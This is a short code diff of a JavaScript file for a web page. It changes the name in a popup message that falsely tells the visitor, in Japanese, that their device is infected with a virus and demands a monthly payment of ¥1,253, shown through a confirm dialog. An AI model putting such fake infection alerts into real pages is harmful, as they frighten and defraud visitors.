@@ -1,7 +1,7 @@
 //同ディレクトリ内のindex.htmlのためのjsファイル
 console.log("ok");
 
-let message = "あなたの端末はウィルスに感染しました。\nNMに毎月¥1,253をを支払いなさい";
+let message = "あなたの端末はウィルスに感染しました。\nΝαότοに毎月¥1,253をを支払いなさい。";
 
 const kure = () => {
     if (confirm(message)) {
